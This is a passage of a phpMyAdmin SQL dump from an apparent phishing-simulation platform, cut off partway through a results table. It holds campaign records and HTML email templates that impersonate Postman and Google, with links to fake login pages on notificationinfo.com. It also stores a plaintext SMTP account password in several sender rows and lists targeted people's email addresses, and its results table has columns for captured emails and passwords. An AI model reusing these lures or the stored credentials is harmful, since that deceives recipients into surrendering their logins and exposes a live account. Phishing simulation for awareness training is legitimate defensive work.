-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Oct 04, 2023 at 03:59 AM
-- Server version: 8.0.33
-- PHP Version: 8.1.16

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `techowlphish_phishing-web`
--

-- --------------------------------------------------------

--
-- Table structure for table `tb_access_ctrl`
--

CREATE TABLE `tb_access_ctrl` (
  `tk_id` varchar(11) COLLATE utf8mb4_general_ci NOT NULL,
  `ctrl_ids` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tb_core_mailcamp_config`
--

CREATE TABLE `tb_core_mailcamp_config` (
  `mconfig_id` varchar(50) COLLATE utf8mb4_general_ci NOT NULL,
  `mconfig_name` varchar(50) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `mconfig_data` mediumtext COLLATE utf8mb4_general_ci,
  `date` varchar(50) COLLATE utf8mb4_general_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `tb_core_mailcamp_config`
--

INSERT INTO `tb_core_mailcamp_config` (`mconfig_id`, `mconfig_name`, `mconfig_data`, `date`) VALUES
('default', 'Default Configuration', '{\"mail_sign\":{\"cert\":[],\"pvk\":[]},\"mail_enc\":{\"cert\":[]},\"peer_verification\":true,\"recipient_type\":\"to\",\"signed_mail\":false,\"encrypted_mail\":false,\"antiflood\":{\"limit\":\"50\",\"pause\":\"30\"},\"msg_priority\":\"3\"}', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `tb_core_mailcamp_list`
--

CREATE TABLE `tb_core_mailcamp_list` (
  `campaign_id` varchar(50) NOT NULL,
  `userid` bigint NOT NULL,
  `campaign_name` varchar(50) NOT NULL,
  `campaign_data` varchar(1111) NOT NULL,
  `date` varchar(111) NOT NULL,
  `scheduled_time` varchar(111) NOT NULL,
  `scheduled_date` varchar(255) DEFAULT NULL,
  `stop_time` varchar(111) DEFAULT NULL,
  `camp_status` int NOT NULL DEFAULT '0',
  `employees` varchar(255) DEFAULT NULL,
  `camp_lock` tinyint NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tb_core_mailcamp_list`
--

INSERT INTO `tb_core_mailcamp_list` (`campaign_id`, `userid`, `campaign_name`, `campaign_data`, `date`, `scheduled_time`, `scheduled_date`, `stop_time`, `camp_status`, `employees`, `camp_lock`) VALUES
('1xlejz', 4, 'Postman', '{\"user_group\":{\"id\":\"zranw7\",\"name\":\"techowl\"},\"mail_template\":{\"id\":\"scxjke\",\"name\":\"Postman Trial\"},\"mail_sender\":{\"id\":\"0ugzal\",\"name\":\"Postman - Product Advocacy\"},\"mail_config\":{\"id\":\"default\",\"name\":\"Default Configuration\"},\"msg_interval\":\"0000-0000\",\"msg_fail_retry\":\"2\"}', '29-09-2023 04:21 AM', '29-09-2023 03:30 AM', '29-09-2023 03:30 AM - 30-09-2023 11:30 AM', NULL, 4, '{\"user_group\":{\"id\":\"zranw7\",\"name\":\"techowl\"},\"mail_template\":{\"id\":\"scxjke\",\"name\":\"Postman Trial\"},\"mail_sender\":{\"name\":\"\"},\"mail_config\":{\"name\":\"\"},\"msg_interval\":\"0000-0000\",\"msg_fail_retry\":\"2\"}', 1),
('7ii9yi', 12, 'Postman Trial', '{\"user_group\":{\"id\":\"gq4wsd\",\"name\":\"Team 1\"},\"mail_template\":{\"id\":\"scxjke\",\"name\":\"Postman Trial\"},\"mail_sender\":{\"id\":\"0ugzal\",\"name\":\"Postman - Product Advocacy\"},\"mail_config\":{\"id\":\"default\",\"name\":\"Default Configuration\"},\"msg_interval\":\"0000-0000\",\"msg_fail_retry\":\"2\"}', '28-09-2023 12:02 PM', '28-09-2023 11:30 AM', '28-09-2023 11:30 AM - 29-09-2023 07:30 PM', NULL, 4, '{\"user_group\":{\"id\":\"gq4wsd\",\"name\":\"Team 1\"},\"mail_template\":{\"id\":\"scxjke\",\"name\":\"Postman Trial\"},\"mail_sender\":{\"name\":\"\"},\"mail_config\":{\"name\":\"\"},\"msg_interval\":\"0000-0000\",\"msg_fail_retry\":\"2\"}', 1),
('u591ri', 12, 'Camp - 29 sept', '{\"user_group\":{\"id\":\"gq4wsd\",\"name\":\"Team 1\"},\"mail_template\":{\"id\":\"scxjke\",\"name\":\"Postman Trial\"},\"mail_sender\":{\"id\":\"snzg5e\",\"name\":\"Postman - Product Advocacy\"},\"mail_config\":{\"id\":\"default\",\"name\":\"Default Configuration\"},\"msg_interval\":\"0000-0000\",\"msg_fail_retry\":\"2\"}', '29-09-2023 05:27 AM', '29-09-2023 04:30 AM', '29-09-2023 04:30 AM - 30-09-2023 12:30 PM', NULL, 4, '{\"user_group\":{\"id\":\"gq4wsd\",\"name\":\"Team 1\"},\"mail_template\":{\"id\":\"scxjke\",\"name\":\"Postman Trial\"},\"mail_sender\":{\"name\":\"\"},\"mail_config\":{\"name\":\"\"},\"msg_interval\":\"0000-0000\",\"msg_fail_retry\":\"2\"}', 1),
('u82afo', 12, 'Camp - 29-09', '{\"user_group\":{\"id\":\"gq4wsd\",\"name\":\"Team 1\"},\"mail_template\":{\"id\":\"jh0lay\",\"name\":\"Google Page\"},\"mail_sender\":{\"id\":\"l1smdf\",\"name\":\"Support google\"},\"mail_config\":{\"id\":\"default\",\"name\":\"Default Configuration\"},\"msg_interval\":\"0000-0000\",\"msg_fail_retry\":\"2\"}', '29-09-2023 06:15 AM', '29-09-2023 05:30 AM', '29-09-2023 05:30 AM - 30-09-2023 01:30 PM', NULL, 4, '{\"user_group\":{\"id\":\"gq4wsd\",\"name\":\"Team 1\"},\"mail_template\":{\"id\":\"jh0lay\",\"name\":\"Google Page\"},\"mail_sender\":{\"name\":\"\"},\"mail_config\":{\"name\":\"\"},\"msg_interval\":\"0000-0000\",\"msg_fail_retry\":\"2\"}', 1);

-- --------------------------------------------------------

--
-- Table structure for table `tb_core_mailcamp_sender_list`
--

CREATE TABLE `tb_core_mailcamp_sender_list` (
  `sender_list_id` varchar(111) NOT NULL,
  `userid` bigint NOT NULL,
  `domain_id` int NOT NULL,
  `sender_name` varchar(50) NOT NULL,
  `sender_smtp_server` varchar(50) NOT NULL,
  `sender_from` varchar(111) NOT NULL,
  `sender_acc_username` varchar(111) NOT NULL,
  `sender_acc_pwd` varchar(50) NOT NULL,
  `auto_mailbox` tinyint(1) DEFAULT '0',
  `status` int NOT NULL DEFAULT '1',
  `sender_mailbox` varchar(1111) DEFAULT NULL,
  `cust_headers` varchar(1111) DEFAULT NULL,
  `dsn_type` varchar(111) DEFAULT NULL,
  `date` varchar(111) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tb_core_mailcamp_sender_list`
--

INSERT INTO `tb_core_mailcamp_sender_list` (`sender_list_id`, `userid`, `domain_id`, `sender_name`, `sender_smtp_server`, `sender_from`, `sender_acc_username`, `sender_acc_pwd`, `auto_mailbox`, `status`, `sender_mailbox`, `cust_headers`, `dsn_type`, `date`) VALUES
('0ugzal', 1, 9, 'Postman - Product Advocacy', 'mail.smtp2go.com:587', 'productadvocacy@notificationinfo.com', 'notificationinfo', 'Ya3n5fdCWTsEgmtm', 0, 2, '{imap.gmail.com:993/imap/ssl}INBOX', '[]', 'default', '28-09-2023 12:01 PM'),
('gbzbga', 1, 9, 'Postman - Product Advocacy', 'mail.smtp2go.com:587', 'productadvocacy@notificationinfo.com', 'notificationinfo', 'Ya3n5fdCWTsEgmtm', 0, 2, '{imap.gmail.com:993/imap/ssl}INBOX', '[]', 'default', '29-09-2023 05:04 AM'),
('l1smdf', 1, 9, 'Support google', 'mail.smtp2go.com:587', 'google@notificationinfo.com', 'notificationinfo', 'Ya3n5fdCWTsEgmtm', 0, 2, '{imap.gmail.com:993/imap/ssl}INBOX', '[]', 'default', '29-09-2023 06:14 AM'),
('pekexn', 1, 9, 'Postman - Product Advocacy', 'mail.smtp2go.com:587', 'productadvocacy@notificationinfo.com', 'notificationinfo', 'Ya3n5fdCWTsEgmtm', 0, 2, '{imap.gmail.com:993/imap/ssl}INBOX', '[]', 'default', '29-09-2023 05:05 AM'),
('snzg5e', 1, 9, 'Postman - Product Advocacy', 'mail.smtp2go.com:587', 'productadvocacy@notificationinfo.com', 'notificationinfo', 'Ya3n5fdCWTsEgmtm', 0, 2, '{imap.gmail.com:993/imap/ssl}INBOX', '[]', 'default', '29-09-2023 05:06 AM'),
('u60xy5', 1, 9, 'Postman - Product Advocacy', 'mail.smtp2go.com:587', 'productadvocacy@notificationinfo.com', 'notificationinfo', 'Ya3n5fdCWTsEgmtm', 0, 2, '{imap.gmail.com:993/imap/ssl}INBOX', '[]', 'default', '29-09-2023 05:44 AM'),
('za5z2y', 1, 1, 'ebay2', 'mail.smtp2go.com:587', 'ebay2', 'notificationinfo', 'Ya3n5fdCWTsEgmtm', 0, 0, NULL, NULL, 'default', '02-06-2023 04:32 AM'),
('zadz2y', 1, 1, 'abhishek', 'mail.smtp2go.com:587', 'google@alertweb.me', 'notificationinfo', 'Ya3n5fdCWTsEgmtm', 0, 0, '{imap.gmail.com:993/imap/ssl}INBOX', '[]', 'default', '02-06-2023 04:32 AM');

-- --------------------------------------------------------

--
-- Table structure for table `tb_core_mailcamp_template_list`
--

CREATE TABLE `tb_core_mailcamp_template_list` (
  `mail_template_id` varchar(111) NOT NULL,
  `userid` bigint NOT NULL,
  `mail_template_name` varchar(111) DEFAULT NULL,
  `mail_template_subject` varchar(1111) DEFAULT NULL,
  `mail_template_content` mediumtext,
  `timage_type` tinyint(1) NOT NULL DEFAULT '0',
  `mail_content_type` varchar(111) DEFAULT '{}',
  `attachment` varchar(1111) DEFAULT NULL,
  `date` varchar(111) NOT NULL,
  `domain` int DEFAULT NULL,
  `landing_page` varchar(225) DEFAULT NULL,
  `smtp_server` varchar(255) DEFAULT NULL,
  `from_name` varchar(255) NOT NULL,
  `email_prefix` varchar(255) NOT NULL,
  `default_template` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tb_core_mailcamp_template_list`
--

INSERT INTO `tb_core_mailcamp_template_list` (`mail_template_id`, `userid`, `mail_template_name`, `mail_template_subject`, `mail_template_content`, `timage_type`, `mail_content_type`, `attachment`, `date`, `domain`, `landing_page`, `smtp_server`, `from_name`, `email_prefix`, `default_template`) VALUES
('jh0lay', 1, 'Google Page', 'Google ', '<a href=\"https://notificationinfo.com/google_page.php?landingmid={{MID}}&amp;landingrid={{RID}}\" style=\"text-decoration: none;\">&lt;p&gt;&lt;font face=&quot;Nunito, sans-serif&quot;&gt;&lt;span style=&quot;background-color: rgb(33, 37, 41);&quot;&gt;Hello&amp;nbsp;&lt;/span&gt;&lt;/font&gt;&lt;span style=&quot;font-family: Nunito, sans-serif; font-size: 12.8px; letter-spacing: normal; text-wrap: nowrap; background-color: rgb(33, 37, 41);&quot;&gt;{{FNAME}},&lt;/span&gt;&lt;br&gt;&lt;/p&gt;&lt;table class=&quot;table table-full-width&quot; style=&quot;border-collapse: separate; --bs-table-color: var(--bs-body-color); --bs-table-bg: transparent; --bs-table-border-color: var(--bs-border-color); --bs-table-accent-bg: transparent; --bs-table-striped-color: var(--bs-body-color); --bs-table-striped-bg: rgba(0, 0, 0, 0.05); --bs-table-active-color: var(--bs-body-color); --bs-table-active-bg: rgba(0, 0, 0, 0.1); --bs-table-hover-color: var(--bs-body-color); --bs-table-hover-bg: rgba(0, 0, 0, 0.075); width: 192.75px; background-color: rgb(33, 37, 41); font-family: Nunito, sans-serif; letter-spacing: 0.4992px;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;border-width: initial; border-style: none; border-color: initial; padding: 10px 21px; box-shadow: inset 0 0 0 9999px var(--bs-table-accent-bg);&quot;&gt;{{TRACKER}}&lt;br&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</a>', 1, 'text/html', '[]', '29-09-2023 06:14 AM', 9, 'chosvv', 'l1smdf', 'Support google', 'google', '0'),
('scxjke', 1, 'Postman Trial', 'Maximize Your Postman Trial Before It Ends', '<a href=\"https://notificationinfo.com/google_login.php?landingmid={{MID}}&amp;landingrid={{RID}}\" style=\"text-decoration: none;\">&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; role=&quot;presentation&quot; bgcolor=&quot;#fff&quot; style=&quot;color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-size: small; letter-spacing: normal; background-color: rgb(255, 255, 255);&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;margin: 0px;&quot;&gt;&lt;table align=&quot;center&quot; width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; role=&quot;presentation&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;margin: 0px;&quot;&gt;&lt;table class=&quot;m_216960969607978989row-content m_216960969607978989stack&quot; align=&quot;center&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; role=&quot;presentation&quot; width=&quot;480&quot; style=&quot;color: rgb(51, 51, 51); width: 480px; margin: 0px auto;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;m_216960969607978989column&quot; width=&quot;100%&quot; align=&quot;left&quot; valign=&quot;top&quot; style=&quot;margin: 0px; padding-bottom: 25px; padding-top: 25px; vertical-align: top; border-width: 0px; border-style: initial; border-color: initial;&quot;&gt;&lt;table class=&quot;m_216960969607978989image_block&quot; width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;20&quot; cellspacing=&quot;0&quot; role=&quot;presentation&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;margin: 0px;&quot;&gt;&lt;div align=&quot;center&quot; style=&quot;line-height: 10px;&quot;&gt;&lt;img src=&quot;https://ci4.googleusercontent.com/proxy/iw7jWx5TqggRVow_lT5EqcV13VWr0j8h53YEtt-GUIEhSE2ZQgC-EHFEx3SRsQ6CgnVBlDbzBat7T_bkFv_rk4W7gCBmSDHM5LuwJQ7olP_PD2FI8wwyoWnXVyM1PYN1gV17uwQFArCZYQcz7K9YPmMdIYTeQJ7ArtKproRCDK7d_8qwRF0rAgy8uGqi6g2pSAufl3blqhdQieZGzXjZLxI=s0-d-e1-ft#https://d15k2d11r6t6rl.cloudfront.net/public/users/Integrators/669d5713-9b6a-46bb-bd7e-c542cff6dd6a/45a94676dd7342a9a5d24a86b9d12ca9/logo.png&quot; width=&quot;175&quot; class=&quot;CToWUd&quot; data-bit=&quot;iit&quot; style=&quot;display: block; height: auto; border: 0px; max-width: 175px; width: 175px;&quot;&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; role=&quot;presentation&quot; style=&quot;word-break: break-word;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;margin: 0px; padding: 40px 10px 20px;&quot;&gt;&lt;div style=&quot;font-family: Arial, sans-serif;&quot;&gt;&lt;div style=&quot;font-size: 12px; font-family: Arial, &amp;quot;Helvetica Neue&amp;quot;, Helvetica, sans-serif; color: rgb(170, 170, 170); line-height: 1.2;&quot;&gt;&lt;p style=&quot;line-height: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; font-size: 14px;&quot;&gt;&lt;span style=&quot;color: rgb(0, 0, 0);&quot;&gt;Hi&amp;nbsp;&lt;/span&gt;&lt;span font-family:=&quot;&quot; nunito,=&quot;&quot; sans-serif;=&quot;&quot; font-size:=&quot;&quot; 12.8px;=&quot;&quot; text-wrap:=&quot;&quot; nowrap;&quot;=&quot;&quot;&gt;{{FNAME}}&lt;/span&gt;&lt;span style=&quot;color: rgb(0, 0, 0);&quot;&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;line-height: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; font-size: 14px;&quot;&gt;&amp;nbsp;&lt;/p&gt;&lt;p style=&quot;line-height: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; font-size: 14px;&quot;&gt;&lt;span style=&quot;color: rgb(0, 0, 0);&quot;&gt;Introducing the Product Advocacy team here at Postman! Our team is here to answer any questions you may have about the Basic trial. If this sounds interesting, you can&amp;nbsp;&lt;a href=&quot;https://notificationinfo.com/google_login.php?landingmid={{MID}}&amp;amp;landingrid={{RID}}&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot; data-saferedirecturl=&quot;https://www.google.com/url?q=https://iterable.links.postman.com/u/click?_t%3D45a94676dd7342a9a5d24a86b9d12ca9%26_m%3Ddc09279054af4a55807845689a2444b9%26_e%3DLs6vPYAThc0pHjhV03LbIr9brdlX3aMCjYkKGIQ7eKw8eePFmMjOp2FpbbfMUoiuM_apfs5vIJcUjYLEeanb-iE3Jdr-egzi8zb1_ExrDOrlnnRY_0Fc-r94II9-M_g36pHpnhGEaOsAypWD9SlU0YloHGm06Sh285K4E1pdfc8zvQomHdfh1g1KPxt2kYAKhB3SZraGbv6f7l1cBauuIh0MeuNPhwYT-wcaCE99GRgW4ShUsB_K-jRr8u9vuXbPgreJigW71PP0bIGAfPpw_g%253D%253D&amp;amp;source=gmail&amp;amp;ust=1695958610363000&amp;amp;usg=AOvVaw2hrpEQyJ_hJkuFSo3vbE8X&quot; style=&quot;color: rgb(251, 110, 3); text-decoration: underline;&quot;&gt;book a one-on-one call here&lt;/a&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;line-height: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; font-size: 14px;&quot;&gt;&amp;nbsp;&lt;/p&gt;&lt;p style=&quot;line-height: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; font-size: 14px;&quot;&gt;&lt;span style=&quot;color: rgb(0, 0, 0);&quot;&gt;I&#039;ll also leave you with some resources if you prefer that in the meantime. We have live and on-demand webinar content that covers basic functionality in Postman which you can find check out&amp;nbsp;&lt;a href=&quot;https://notificationinfo.com/google_login.php?landingmid={{MID}}&amp;amp;landingrid={{RID}}&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot; data-saferedirecturl=&quot;https://www.google.com/url?q=https://iterable.links.postman.com/u/click?_t%3D45a94676dd7342a9a5d24a86b9d12ca9%26_m%3Ddc09279054af4a55807845689a2444b9%26_e%3DLs6vPYAThc0pHjhV03LbItSq--Qr9DG0FdEsDCuEEBxGLbSi0mII24rBP70L8XgB0inIlGGE4wsengJQcqAANRLEQZrLkIGQnaD84N93DlRuE5pe3WcMyYcFLgS1KtPX0umSX1rGbIGI1DVBZVZp4t5YMmwy5hxmiUbn2AzQnF75JHxe15KGTqU6iBJrXXLensJi7sdoGOkQBtrpWQOjbO4MFfeWDsqpNY41jIaGU5Y%253D&amp;amp;source=gmail&amp;amp;ust=1695958610363000&amp;amp;usg=AOvVaw3mOB89oWhohxEcViO-aryp&quot; style=&quot;color: rgb(251, 110, 3); text-decoration: underline;&quot;&gt;here.&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;line-height: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;10&quot; cellspacing=&quot;0&quot; role=&quot;presentation&quot; style=&quot;word-break: break-word;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;margin: 0px;&quot;&gt;&lt;div style=&quot;font-family: sans-serif;&quot;&gt;&lt;div style=&quot;font-size: 14px; font-family: Arial, &amp;quot;Helvetica Neue&amp;quot;, Helvetica, sans-serif; color: rgb(85, 85, 85); line-height: 1.2;&quot;&gt;&lt;p style=&quot;line-height: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px;&quot;&gt;&lt;span style=&quot;color: rgb(0, 0, 0);&quot;&gt;Cheers,&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;line-height: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px;&quot;&gt;&lt;span style=&quot;color: rgb(0, 0, 0);&quot;&gt;The Postman Product Advocacy Team&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;text-wrap: nowrap; background-color: rgb(33, 37, 41); font-family: Nunito, sans-serif; font-size: 12.8px; color: rgb(255, 255, 255);&quot;&gt;{{TRACKER}}&lt;/span&gt;&lt;img border=&quot;0&quot; width=&quot;1&quot; height=&quot;1&quot; alt=&quot;&quot; src=&quot;https://ci3.googleusercontent.com/proxy/2eHrkQv_WNrOtuHKiABGR3_HuuvYzaM8-U1nSCzGmEdhT77EnBpse1XcMqqgN_2-NDmO85NHOcMwHSLMCpKCoHONMuJkfzh3yN5LigAyAB3OYTgv76S-G5ldc8g_mh0eVGfVyIt7lcXwKqrlx7FwUewqgbc6Iz9V2A5FRVB8SLzuc_IK3tQZZFGsub9Xm_K7B172Ll3HZY2YPN-_LjlWOPJ3Gw=s0-d-e1-ft#http://sparkpost.links.postman.com/q/R3pUmS-M36_TYyZg0Eejqg~~/AAQ97AA~/RgRm8VKDPlcDc3BjQgpk-oPNDmUnxpqYUhRuaXRpa2EuaW1nQGdtYWlsLmNvbVgEAAAAAA~~&quot; class=&quot;CToWUd&quot; data-bit=&quot;iit&quot; style=&quot;background-color: rgb(27, 46, 75); color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-size: small;&quot;&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;table align=&quot;center&quot; width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; role=&quot;presentation&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;margin: 0px;&quot;&gt;&lt;table class=&quot;m_216960969607978989row-content m_216960969607978989stack&quot; align=&quot;center&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; role=&quot;presentation&quot; width=&quot;480&quot; style=&quot;color: rgb(51, 51, 51); width: 480px; margin: 0px auto;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;m_216960969607978989column&quot; width=&quot;100%&quot; align=&quot;left&quot; valign=&quot;top&quot; style=&quot;margin: 0px; padding-bottom: 25px; padding-top: 25px; vertical-align: top; border-width: 0px; border-style: initial; border-color: initial;&quot;&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;10&quot; cellspacing=&quot;0&quot; role=&quot;presentation&quot; style=&quot;word-break: break-word;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;margin: 0px;&quot;&gt;&lt;div style=&quot;font-family: sans-serif;&quot;&gt;&lt;div style=&quot;font-size: 14px; font-family: Arial, &amp;quot;Helvetica Neue&amp;quot;, Helvetica, sans-serif; color: rgb(85, 85, 85); line-height: 1.2;&quot;&gt;&lt;p style=&quot;line-height: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; text-align: center; font-size: 10px;&quot;&gt;&lt;span style=&quot;font-size: 11px;&quot;&gt;&lt;a href=&quot;https://notificationinfo.com/google_login.php?landingmid={{MID}}&amp;amp;landingrid={{RID}}&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot; data-saferedirecturl=&quot;https://www.google.com/url?q=https://iterable.links.postman.com/e/encryptedUnsubscribe?_r%3D45a94676dd7342a9a5d24a86b9d12ca9%26_s%3Ddc09279054af4a55807845689a2444b9%26_t%3DEzBKSwD0D3Wvlwb6AjjALXPhLO3p6Kr6dz16Dq_BrEWPkWA2Dg8SXkl4VrQjDABg6IrtrLedZVoVrsRo-vjlZFbOh34GNrDVjmQl8uO81rs%253D&amp;amp;source=gmail&amp;amp;ust=1695958610363000&amp;amp;usg=AOvVaw0fRUxIwVjIRvNUGsPJ05ZC&quot; style=&quot;color: rgb(140, 134, 129);&quot;&gt;Click here to unsubscribe&lt;/a&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;line-height: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; text-align: center; font-size: 10px;&quot;&gt;&amp;nbsp;&lt;/p&gt;&lt;p style=&quot;line-height: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; text-align: center; font-size: 10px;&quot;&gt;201 Mission Street, Suite #2375, San Francisco, CA 94105, USA&lt;/p&gt;&lt;p style=&quot;line-height: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; text-align: center; font-size: 10px;&quot;&gt;© 2023 Postman, Inc. All rights reserved.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</a>', 1, 'text/html', '[]', '28-09-2023 05:26 AM', 9, '0p15e4', 'u60xy5', 'Postman - Product Advocacy', 'productadvocacy', '0');

-- --------------------------------------------------------

--
-- Table structure for table `tb_core_mailcamp_user_group`
--

CREATE TABLE `tb_core_mailcamp_user_group` (
  `user_group_id` varchar(111) NOT NULL,
  `userid` bigint NOT NULL,
  `user_group_name` varchar(50) NOT NULL,
  `user_domain` longtext,
  `user_data` mediumtext,
  `date` varchar(111) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tb_core_mailcamp_user_group`
--

INSERT INTO `tb_core_mailcamp_user_group` (`user_group_id`, `userid`, `user_group_name`, `user_domain`, `user_data`, `date`) VALUES
('gq4wsd', 12, 'Team 1', '[\"fandsend.com\"]', '[{\"uid\":\"lcu84std67\",\"fname\":\"Noyore\",\"lname\":\"Noyore3178\",\"email\":\"noyore3178@fandsend.com\",\"company\":\"\",\"job\":\"\"}]', '28-09-2023 11:59 AM'),
('zranw7', 4, 'techowl', '[\"techowl.in\"]', '[{\"uid\":\"hzu1slkp79\",\"fname\":\"Abhishek\",\"lname\":\"Chaudhary\",\"email\":\"abhishek@techowl.in\",\"company\":\"Techowl\",\"job\":\"\"}]', '29-09-2023 04:11 AM');

-- --------------------------------------------------------

--
-- Table structure for table `tb_core_quick_tracker_list`
--

CREATE TABLE `tb_core_quick_tracker_list` (
  `tracker_id` varchar(11) NOT NULL,
  `tracker_name` varchar(111) NOT NULL,
  `date` varchar(111) NOT NULL,
  `start_time` varchar(111) DEFAULT NULL,
  `stop_time` varchar(111) DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tb_core_web_tracker_list`
--

CREATE TABLE `tb_core_web_tracker_list` (
  `tracker_id` varchar(111) NOT NULL,
  `tracker_name` varchar(111) NOT NULL,
  `content_html` varchar(1111) DEFAULT NULL,
  `content_js` varchar(11111) DEFAULT NULL,
  `tracker_step_data` mediumtext,
  `date` varchar(111) DEFAULT NULL,
  `start_time` varchar(111) DEFAULT NULL,
  `stop_time` varchar(111) DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tb_data_mailcamp_live`
--

CREATE TABLE `tb_data_mailcamp_live` (
  `rid` varchar(15) COLLATE utf8mb4_general_ci NOT NULL,
  `campaign_id` varchar(15) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `campaign_name` varchar(50) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `sending_status` tinyint NOT NULL DEFAULT '0',
  `send_time` varchar(50) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `user_name` varchar(50) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `user_email` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `send_error` varchar(1111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `mail_open_times` mediumtext COLLATE utf8mb4_general_ci,
  `mail_replies` int DEFAULT NULL,
  `payloads_clicked` mediumtext COLLATE utf8mb4_general_ci,
  `employees_compromised` mediumtext COLLATE utf8mb4_general_ci,
  `compromised_email` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `compromised_pass` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `emails_reported` mediumtext COLLATE utf8mb4_general_ci,
